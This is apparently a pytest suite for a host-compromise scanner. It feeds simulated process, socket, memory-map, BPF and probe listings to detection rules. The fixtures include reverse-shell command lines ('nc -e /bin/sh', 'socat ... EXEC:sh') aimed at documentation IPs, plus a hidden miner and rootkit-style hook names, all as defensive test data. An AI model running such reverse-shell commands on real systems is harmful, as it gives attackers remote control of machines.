import json
from pathlib import Path

import pytest

from modules import hostscan
from shellcraft.modkit import ModuleError

MD = Path(__file__).resolve().parent.parent / "modules" / "hostscan.md"

PS_CLEAN = """# sshrun web01 ps (untrusted remote output)
    1     0 root                    99999 /sbin/init splash
    2     0 root                    99999 [kthreadd]
  812     1 root                     5000 sshd: /usr/sbin/sshd -D [listener]
  900   812 bob                      4000 -bash
 1500   900 bob                        20 ps -eo pid=,ppid=,user:20=,etimes=,args=
 2000     1 root                      300 nginx: master process /usr/sbin/nginx
 2001  2000 www-data                  299 nginx: worker process
"""
PS_BAD = PS_CLEAN + """ 2002  2000 www-data                   60 sh -c id
 2003  2000 www-data                   50 python3 -c import pty
 1203   900 bob                       200 nc -e /bin/sh 203.0.113.9 4444
 1204   812 bob                        10 socat TCP:203.0.113.9:80 EXEC:sh
 3000     1 root                       90 /tmp/.hidden/miner -o pool
 3001     1 root                       80 python3 /dev/shm/run.py
"""
SS_CLEAN = """tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=812,fd=3))
tcp LISTEN 0 511 *:443 *:* users:(("nginx",pid=2000,fd=6))
tcp LISTEN 0 4096 [::]:80 [::]:* users:(("nginx",pid=2000,fd=7))
tcp LISTEN 0 128 127.0.0.1:8123 0.0.0.0:*
udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*
tcp ESTAB 0 0 10.0.0.5:22 203.0.113.9:51022 users:(("sshd",pid=900,fd=4))
tcp ESTAB 0 0 10.0.0.5:51000 93.184.216.34:443
"""
SS_BAD = SS_CLEAN + """tcp LISTEN 0 1 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=1203,fd=3))
tcp ESTAB 0 0 10.0.0.5:4444 203.0.113.9:51022 users:(("nc",pid=1203,fd=4))
tcp ESTAB 0 0 10.0.0.5:40000 198.51.100.7:4444 users:(("bash",pid=900,fd=2))
tcp ESTAB 0 0 10.0.0.5:40001 198.51.100.8:9001 users:(("tor",pid=77,fd=2))
tcp ESTAB 0 0 10.0.0.5:40002 198.51.100.9:44444 users:(("bash",pid=900,fd=5))
""" + "".join(f"tcp ESTAB 0 0 10.0.0.5:80 192.0.2.99:{50000 + i}\n" for i in range(20))
EXES_CLEAN = "# sshrun web01 exes\n1 /usr/lib/systemd/systemd\n2\n812 /usr/sbin/sshd\n"
EXES_BAD = "1203 /tmp/x (deleted)\n1204 /memfd:payload (deleted)\n3000 /var/tmp/.m/miner\n812 /usr/sbin/sshd (deleted)\n"
MAPS_CLEAN = """55d0c0000000-55d0c0010000 r--p 00000000 fd:01 1234 /usr/sbin/sshd
55d0c0010000-55d0c0050000 r-xp 00010000 fd:01 1234 /usr/sbin/sshd
7f1000000000-7f1000150000 r-xp 00000000 fd:01 99 /usr/lib/x86_64-linux-gnu/libc.so.6
7f1000200000-7f1000210000 rw-p 00000000 00:00 0
7ffd1000000-7ffd1020000 rw-p 00000000 00:00 0 [stack]
7ffd1030000-7ffd1034000 r-xp 00000000 00:00 0 [vdso]
7f1000300000-7f1000301000 rw-s 00000000 00:01 5 /dev/zero (deleted)
"""
MAPS_BAD = MAPS_CLEAN + """7f2000000000-7f2000001000 rwxp 00000000 00:00 0
7f2100000000-7f2100001000 rwxp 00000000 fd:01 77 /opt/app/plugin.bin
7f2200000000-7f2200001000 r-xp 00000000 fd:01 78 /tmp/inject.so
7f2300000000-7f2300001000 r-xp 00000000 fd:01 79 /usr/lib/x86_64-linux-gnu/libdeleted.so.1 (deleted)
7f2400000000-7f2400001000 r-xp 00000000 00:01 80 /memfd:x (deleted)
7f2500000000-7f2500001000 r-xp 00000000 fd:01 81 /home/bob/libsneaky.so
"""
BPF_CLEAN = json.dumps([
    {"id": 3, "type": "tracing", "name": "dump_bpf_prog", "tag": "aa", "gpl_compatible": True, "loaded_at": 1700000000,
     "uid": 0, "bytes_xlated": 100, "pids": [{"pid": 1, "comm": "systemd"}]},
    {"id": 4, "type": "lsm", "name": "restrict", "tag": "bb", "loaded_at": 1700000001, "uid": 0,
     "pids": [{"pid": 9, "comm": "agent"}]},
])
BPF_BAD = """## prog
[{"id": 10, "type": "kprobe", "name": "hook_getdents", "tag": "cc", "gpl_compatible": true, "loaded_at": 1700000100,
  "uid": 0, "bytes_xlated": 300, "pids": [{"pid": 1203, "comm": "evil"}]},
 {"id": 11, "type": "kprobe", "tag": "dd", "loaded_at": 1700000101, "uid": 0},
 {"id": 12, "type": "tracepoint", "name": "trace_exec", "tag": "ee", "loaded_at": 1700000102, "uid": 0,
  "pids": [{"pid": 500, "comm": "falco"}]},
 {"id": 13, "type": "cgroup_skb", "name": "egress", "tag": "ff", "loaded_at": 1700000103, "uid": 0,
  "pids": [{"pid": 1, "comm": "systemd"}]},
 {"id": 14, "type": "xdp", "name": "filt", "tag": "11", "loaded_at": 1700000104, "uid": 0,
  "pids": [{"pid": 600, "comm": "mystery"}]},
 {"id": 15, "type": "sched_cls", "name": "pinned", "tag": "22", "loaded_at": 1700000105, "uid": 0},
 {"id": 16, "type": "tracing", "name": "orphan", "tag": "33", "loaded_at": 1700000106, "uid": 0}]
## link
[{"id": 7, "type": "perf_event", "prog_id": 10, "pids": [{"pid": 1203, "comm": "evil"}]}]
## map
[{"id": 20, "type": "hash", "name": "hidden_pids", "bytes_key": 4, "bytes_value": 1, "max_entries": 64,
  "pids": [{"pid": 1203, "comm": "evil"}]},
 {"id": 21, "type": "prog_array", "name": "calls", "bytes_key": 4, "bytes_value": 4, "max_entries": 8}]
"""
PROBES_CLEAN = "## kprobe_events\n## uprobe_events\n"
PROBES_BAD = """# sshrun web01 probes
## kprobe_events
p:kprobes/hook_open do_sys_open
r:kprobes/hook_connect tcp_v4_connect
p:kprobes/hide_ls __x64_sys_getdents64
p:kprobes/hide_ports tcp4_seq_show
p:kprobes/quiet some_internal_fn
## uprobe_events
p:uprobes/ssl /usr/lib/x86_64-linux-gnu/libssl.so.3:0x12345
p:uprobes/libc /usr/lib/x86_64-linux-gnu/libc.so.6:0x2000
p:uprobes/pam /usr/lib/x86_64-linux-gnu/libpam.so.0:0x10
p:uprobes/ssh /usr/sbin/sshd:0x9999
p:uprobes/tmp /tmp/evil:0x10
p:uprobes/misc /usr/bin/python3.11:0x44
"""
JOIN = f"""# sshrun web01 join
## ps
{PS_BAD}
## ss
{SS_BAD}
## exes
{EXES_BAD}
900 /usr/bin/bash
2000 /usr/sbin/nginx
## maps 1203
{MAPS_BAD}
"""


def hs(*args, stdin=""):
    return hostscan.run(list(args), stdin)


def rules_of(out: str) -> set[str]:
    return {ln.split()[2] for ln in out.splitlines() if ln.startswith("FLAG ")}


def flags_of(out: str) -> list[str]:
    return [ln for ln in out.splitlines() if ln.startswith("FLAG ")]


# One bad sample for every rule: (subcommand args, stdin, rule id)
CASES = [
    (["exes"], EXES_BAD, "deleted_exe"),
    (["exes"], EXES_BAD, "memfd_exe"),
    (["exes"], EXES_BAD, "writable_exe"),
    (["ps"], PS_BAD, "writable_exe"),
    (["ps"], PS_BAD, "web_child_shell"),
    (["ps"], PS_BAD, "sshd_child_nc"),
    (["join"], JOIN, "masquerade"),
    (["ss"], SS_BAD, "listen_unknown"),
    (["join"], JOIN, "listen_writable"),
    (["ss"], SS_BAD, "conn_flood"),
    (["ss"], SS_BAD, "conn_rare_port"),
    (["ss"], SS_BAD, "conn_shell_highport"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_anon_rwx"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_file_rwx"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_writable_file"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_deleted_file"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_memfd"),
    (["maps", "--pid", "1203"], MAPS_BAD, "maps_nonsystem_lib"),
    (["bpf"], BPF_BAD, "bpf_prog"),
    (["bpf"], BPF_BAD, "bpf_prog_anon"),
    (["bpf"], BPF_BAD, "bpf_no_pids"),
    (["bpf"], BPF_BAD, "bpf_link"),
    (["bpf"], BPF_BAD, "bpf_map_name"),
    (["probes"], PROBES_BAD, "kprobe_hook"),
    (["probes"], PROBES_BAD, "kprobe_rootkit"),
    (["probes"], PROBES_BAD, "uprobe_lib"),
    (["probes"], PROBES_BAD, "uprobe_auth"),
    (["probes"], PROBES_BAD, "uprobe_writable"),
    (["probes"], PROBES_BAD, "probe_other"),
]


@pytest.mark.parametrize("args, text, rule", CASES, ids=[c[2] + ":" + c[0][0] for c in CASES])
def test_rule_fires(args, text, rule):
    assert rule in rules_of(hs(*args, stdin=text))


def test_every_rule_has_a_case_and_is_documented():
    ids = [r["id"] for r in hostscan.RULES]
    assert len(ids) == len(set(ids))
    assert {c[2] for c in CASES} == set(ids)
    md = MD.read_text()
    for rule in ids:
        assert f"`{rule}`" in md
    for r in hostscan.RULES:
        assert r["severity"] in hostscan.SEVERITIES and r["description"]


@pytest.mark.parametrize("args, text", [
    (["ps"], PS_CLEAN), (["ss"], SS_CLEAN), (["exes"], EXES_CLEAN), (["maps", "--pid", "812"], MAPS_CLEAN),
    (["bpf"], BPF_CLEAN), (["bpf"], "[]"), (["probes"], PROBES_CLEAN),
])
def test_clean_samples_have_no_flags(args, text):
    out = hs(*args, stdin=text)
    assert out.endswith("no flags\n")
    assert "FLAG" not in out


def test_clean_join():
    text = f"## ps\n{PS_CLEAN}\n## ss\n{SS_CLEAN}\n## exes\n1 /usr/lib/systemd/systemd\n812 /usr/sbin/sshd\n900 /usr/bin/bash\n"
    out = hs("join", stdin=text)
    assert out.endswith("no flags\n")
    assert "nginx(2000)" in out  # a listener is a process of interest even without findings


def test_severities_of_specific_findings():
    exes = hs("exes", stdin=EXES_BAD)
    assert "FLAG high deleted_exe 1203: binary deleted from disk: /tmp/x" in exes
    assert "FLAG medium deleted_exe 812" in exes and "package upgrade" in exes
    bpf = hs("bpf", stdin=BPF_BAD)
    assert "FLAG high bpf_prog_anon prog 11 kprobe (unnamed)" in bpf
    assert "FLAG info bpf_prog prog 12 tracepoint trace_exec" in bpf
    assert "FLAG medium bpf_prog prog 14 xdp filt" in bpf
    assert "FLAG info bpf_prog prog 13 cgroup_skb egress" in bpf
    assert "FLAG medium bpf_map_name map 20 hash hidden_pids" in bpf
    assert "calls" not in "".join(flags_of(bpf))
    probes = hs("probes", stdin=PROBES_BAD)
    assert "FLAG high kprobe_rootkit kprobe kprobes/hide_ports" in probes
    assert "FLAG high kprobe_rootkit kprobe kprobes/hide_ls" in probes
    assert "FLAG high uprobe_auth uprobe uprobes/pam" in probes
    assert "FLAG medium uprobe_lib uprobe uprobes/ssl" in probes
    assert "kprobes/quiet" in "".join(flags_of(probes)) and "FLAG info probe_other kprobe kprobes/quiet" in probes
    ss = hs("ss", stdin=SS_BAD)
    assert "FLAG high conn_rare_port" in ss and "198.51.100.7:4444" in ss
    assert "FLAG medium conn_rare_port tcp 10.0.0.5:40001" in ss
    assert "FLAG low listen_unknown tcp 0.0.0.0:4444 (1203/nc)" in ss
    assert "conn_flood 192.0.2.99: 20 established" in ss
    assert "8123" not in "".join(flags_of(ss))  # loopback is not wildcard


def test_ps_web_child_python_is_medium_and_names_masquerade_is_join_only():
    out = hs("ps", stdin=PS_BAD)
    assert "FLAG medium web_child_shell 2003/python3" in out
    assert "masquerade" not in out


def test_masquerade_rules():
    text = """## ps
 1 0 root 900 /sbin/init
 5 1 root 90 [kworker/0:1]
 6 1 root 90 [kthreadd]
 7 1 root 90 python3 /opt/app.py
 8 1 root 90 sleep 100
 9 1 root 90 -bash
## exes
1 /usr/lib/systemd/systemd
5 /tmp/real
6
7 /usr/bin/python3.11
8 /usr/bin/cat
9 /usr/bin/bash
"""
    out = hs("join", stdin=text)
    assert "FLAG high masquerade 5/[kworker/0:1]" in out
    assert "FLAG medium masquerade 8/sleep" in out
    assert not [f for f in flags_of(out) if "masquerade 1/" in f or "masquerade 6" in f or "masquerade 7" in f
                or "masquerade 9" in f]


def test_join_table_has_chain_connections_and_flags():
    out = hs("join", stdin=JOIN)
    block = out.split("PID 1203")[1].split("\n\n")[0]
    assert "PPID 900" in block and "USER bob" in block and "AGE 3m" in block
    assert "EXE /tmp/x (deleted)" in block
    assert "CHAIN  systemd(1) > sshd(812) > bash(900) > nc(1203)" in block or "init(1) > sshd(812) > bash(900) > nc(1203)" in block
    assert "LISTEN tcp 0.0.0.0:4444" in block
    assert "PEERS" in block and "FLAGS" in block and "deleted_exe" in block
    assert "FLAG high maps_anon_rwx pid 1203/nc [anon]" in out
    data = json.loads(hs("join", "-o", "json", stdin=JOIN))
    row = next(r for r in data["rows"] if r["pid"] == 1203)
    assert row["chain"][-3:] == ["sshd(812)", "bash(900)", "nc(1203)"]
    assert row["exe"] == "/tmp/x (deleted)" and "deleted_exe" in row["flags"]


def test_join_needs_sections_and_notes_unknown_ones():
    with pytest.raises(ModuleError, match="## ps"):
        hs("join", stdin="1 0 root 5 /sbin/init\n")
    out = hs("join", stdin="## ps\n1 0 root 5 /sbin/init\n## wat\nx\n")
    assert "note: ignored section(s): wat" in out


def test_comments_and_section_markers_are_ignored():
    text = "# sshrun web01 ps (untrusted remote output)\n## ps\n   \n# another\n" + PS_CLEAN
    out = hs("ps", stdin=text)
    assert "sshrun" not in out and out.endswith("no flags\n")
    assert "note:" not in out


def test_json_output_shape_and_determinism():
    out = hs("ps", "-o", "json", stdin=PS_BAD)
    data = json.loads(out)
    assert set(data) == {"rows", "flags"}
    assert all(set(f) == {"severity", "rule", "subject", "reason"} for f in data["flags"])
    assert data["rows"][0]["pid"] == 1
    assert out == hs("ps", "-o", "json", stdin=PS_BAD)
    sev = [hostscan.RANK[f["severity"]] for f in data["flags"]]
    assert sev == sorted(sev, reverse=True)
    assert json.loads(hs("exes", "-o", "json", stdin=EXES_CLEAN))["flags"] == []


def test_limit_caps_rows_but_not_flags():
    out = hs("ps", "--limit", "2", stdin=PS_BAD)
    assert "... " in out and "more row(s), raise --limit" in out
    assert "web_child_shell" in out and "sshd_child_nc" in out
    data = json.loads(hs("ps", "--limit", "3", "-o", "json", stdin=PS_BAD))
    assert len(data["rows"]) == 3 and data["truncated"] > 0
    with pytest.raises(ModuleError, match="--limit"):
        hs("ps", "--limit", "0", stdin=PS_CLEAN)


def test_default_limit_is_200():
    big = "".join(f"{i} 1 root 5 /usr/bin/x{i}\n" for i in range(1, 251))
    out = hs("ps", stdin=big)
    assert "50 more row(s)" in out


def test_malformed_input():
    out = hs("ps", stdin="garbage line\n1 0 root 5 /sbin/init\nx y z\n")
    assert "note: 2 malformed line(s) skipped" in out
    for sub, text in [("ps", "nothing useful here"), ("ss", "hello world"), ("exes", "abc def"),
                      ("maps", "not a maps line")]:
        with pytest.raises(ModuleError, match="look like"):
            hs(sub, stdin=text)
    for sub in SUBS:
        with pytest.raises(ModuleError, match="no input" if sub != "join" else "expected"):
            hs(sub, stdin="# only a comment\n")
    with pytest.raises(ModuleError, match="not valid JSON"):
        hs("bpf", stdin="Error: can't get next program: Operation not permitted")
    with pytest.raises(ModuleError, match="look like"):
        hs("probes", stdin="what is this\n")
    # JSON of the wrong shape is tolerated
    assert hs("bpf", stdin='[1, "x", {"id": 1, "type": "tracing", "pids": 5}]').endswith("1 flag(s)\n")


SUBS = ["ps", "ss", "exes", "maps", "bpf", "probes", "join"]


def test_argument_errors():
    with pytest.raises(ModuleError, match="invalid choice"):
        hs("frobnicate", stdin="x")
    with pytest.raises(ModuleError, match="required"):
        hs(stdin="x")
    with pytest.raises(ModuleError, match="--pid"):
        hs("maps", "--pid", "0", stdin=MAPS_CLEAN)
    with pytest.raises(ModuleError, match="invalid choice"):
        hs("ps", "-o", "xml", stdin=PS_CLEAN)


def test_maps_table_groups_by_path_and_names_pid():
    out = hs("maps", "--pid", "1203", stdin=MAPS_BAD)
    assert "pid 1203 [anon]" in out and "pid ? " not in out
    assert "/usr/sbin/sshd" in out and "[anon]" in out
    assert "(2 mappings" not in out
    assert "pid ? [anon]" in hs("maps", stdin=MAPS_BAD)
    assert "FLAG high maps_writable_file pid 1203 /tmp/inject.so" in out
    assert "FLAG high maps_memfd pid 1203 /memfd:x (deleted)" in out
    assert "FLAG medium maps_deleted_file pid 1203 /usr/lib/x86_64-linux-gnu/libdeleted.so.1 (deleted)" in out
    assert "dev/zero" not in "".join(flags_of(out))


def test_bpf_accepts_bare_arrays_of_each_kind():
    prog = '[{"id": 1, "type": "kprobe", "name": "x", "tag": "t", "pids": [{"pid": 5, "comm": "weird"}]}]'
    link = '[{"id": 2, "type": "perf_event", "prog_id": 1}]'
    mp = '[{"id": 3, "type": "sockmap", "name": "ports", "bytes_key": 4, "bytes_value": 4, "max_entries": 8}]'
    out = hs("bpf", stdin=prog + "\n" + link + "\n" + mp)
    assert rules_of(out) == {"bpf_prog", "bpf_link", "bpf_map_name"}
    assert "kind" not in out.splitlines()[0].lower() or "KIND" in out.splitlines()[0]


# ── user rules file ──────────────────────────────────────────────────────────

@pytest.fixture
def rules_file(tmp_path, monkeypatch):
    monkeypatch.setenv("SHELLCRAFT_HOME", str(tmp_path))

    def write(text):
        (tmp_path / "hostscan-rules.toml").write_text(text)
    return write


def test_rules_file_suppresses_ports_owners_and_paths(rules_file):
    rules_file('known_ports = [4444, 9001]\nknown_owners = ["evil", "mystery", "falco"]\n'
               'known_paths = ["/tmp/*", "/var/tmp/*", "/opt/app/*"]\n')
    ss = hs("ss", stdin=SS_BAD)
    assert "conn_rare_port" not in ss and "listen_unknown" not in ss
    assert "conn_shell_highport" in ss and "suppressed by hostscan-rules.toml" in ss
    bpf = hs("bpf", stdin=BPF_BAD)
    assert "prog 10 " not in bpf.split("FLAG", 1)[-1] or "bpf_prog" not in "".join(flags_of(bpf)).replace("bpf_prog_anon", "")
    assert "xdp" not in "".join(flags_of(bpf))
    assert "falco" not in "".join(flags_of(bpf))
    assert "deleted_exe" not in hs("exes", stdin="1203 /tmp/x (deleted)\n")
    assert hs("exes", stdin="1203 /tmp/x (deleted)\n").endswith("no flags\n")


def test_bad_rules_file_is_a_single_note_not_a_crash(rules_file):
    rules_file("this is = = not toml")
    out = hs("exes", stdin=EXES_BAD)
    notes = [ln for ln in out.splitlines() if ln.startswith("note: ")]
    assert len(notes) == 1 and "hostscan-rules.toml ignored" in notes[0]
    assert "deleted_exe" in out
    rules_file('known_ports = "22"\nknown_owners = [1]\nbogus = 1\n')
    notes = [ln for ln in hs("exes", stdin=EXES_BAD).splitlines() if ln.startswith("note: ")]
    assert len(notes) == 1 and "known_ports" in notes[0] and "known_owners" in notes[0] and "bogus" in notes[0]
    data = json.loads(hs("exes", "-o", "json", stdin=EXES_BAD))
    assert len(data["notes"]) == 1


def test_missing_rules_file_is_silent(tmp_path, monkeypatch):
    monkeypatch.setenv("SHELLCRAFT_HOME", str(tmp_path / "nothing-here"))
    assert "note:" not in hs("exes", stdin=EXES_CLEAN)
